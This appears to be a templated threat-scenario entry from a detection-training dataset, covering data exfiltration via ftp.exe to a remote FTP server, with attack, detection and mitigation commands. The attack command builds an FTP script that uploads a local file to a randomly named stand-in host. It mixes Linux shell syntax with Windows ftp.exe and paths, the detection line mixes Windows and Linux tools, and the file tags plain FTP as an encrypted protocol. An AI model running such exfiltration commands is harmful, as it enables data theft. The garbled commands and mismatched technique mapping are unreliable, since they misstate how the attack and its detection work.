---
type: campaign
scenario_id: 172
tactic: Exfiltration
technique: "T1048.001: Exfiltration Over Symmetric Encrypted Protocol"
technique_id: T1048.001
tags: [campaign, lotl, exfiltration]
---

# Using ftp.exe to exfiltrate data to remote FTP server.

## Threat Description
Using ftp.exe to exfiltrate data to remote FTP server.

## Attack Command
```
echo open $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com>ftp.txt && echo user $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8) $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | head -c 12)>>ftp.txt && echo put C:\$(echo data$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).txt)>>ftp.txt && ftp -s:ftp.txt
```

## Detection Logic
Monitor ftp: `wmic process where name='ftp.exe' get commandline | findstr put`; Monitor FTP traffic: `netstat -anp | grep :21`.

## Mitigation
Restrict ftp: `icacls %windir%\System32\ftp.exe /deny Everyone:RX`; Block FTP outbound: `netsh advfirewall firewall add rule name='Block FTP' dir=out action=block protocol=TCP remoteport=21`.

## AI Training Prompt
Train AI to detect ftp exfiltration and suggest FTP restrictions.

## References
- MITRE ATT&CK T1048.001: https://attack.mitre.org/techniques/T1048/001/
- CWE-319: https://cwe.mitre.org/data/definitions/319.html
